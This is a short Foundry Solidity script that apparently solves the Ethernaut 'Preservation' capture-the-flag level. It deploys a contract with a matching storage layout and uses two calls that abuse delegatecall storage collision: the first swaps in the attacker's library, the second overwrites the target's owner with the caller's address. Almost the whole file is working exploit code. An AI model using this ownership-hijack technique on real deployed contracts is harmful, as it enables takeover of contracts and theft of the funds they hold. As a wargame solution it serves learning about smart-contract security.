// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MyLibraryContract {
    // stores a timestamp
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationSolution is Script {

    Preservation public preservationInstance = Preservation(0xA151b4Cd7471C5058c6b4C7db0EAe1d344694868);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.logAddress(preservationInstance.owner());

        address my_addr = vm.envAddress("PUBLIC_KEY");
        MyLibraryContract myLib = new MyLibraryContract();
        preservationInstance.setSecondTime(uint256(uint160(address(myLib))));
        preservationInstance.setFirstTime(uint256(uint160(address(my_addr))));

        console.logAddress(preservationInstance.owner());

        vm.stopBroadcast();
    }
}